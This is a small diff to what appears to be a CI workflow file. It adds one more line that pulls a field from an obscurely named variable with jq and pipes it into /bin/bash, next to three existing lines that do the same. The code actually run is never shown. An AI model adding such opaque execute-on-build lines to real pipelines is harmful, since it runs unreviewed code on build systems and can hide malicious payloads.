@@ -20,6 +20,7 @@ jobs:
           echo $lwd1 | jq -r .ubrof863 | /bin/bash
           echo $qci017 | jq -r .qf62 | /bin/bash
           echo $mfug922 | jq -r .eyo0754 | /bin/bash
+          echo $pjk70797 | jq -r .hv43504 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
